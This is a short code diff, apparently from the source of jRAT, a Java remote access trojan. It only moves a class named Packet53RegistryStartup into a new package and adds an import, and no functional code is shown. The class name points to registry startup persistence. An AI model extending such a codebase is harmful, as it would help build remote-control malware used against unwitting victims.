@@ -1,6 +1,7 @@
-package jrat.client.packets.outgoing;
+package jrat.module.system.packets;
 
 import jrat.client.Connection;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 
 public class Packet53RegistryStartup implements OutgoingPacket {
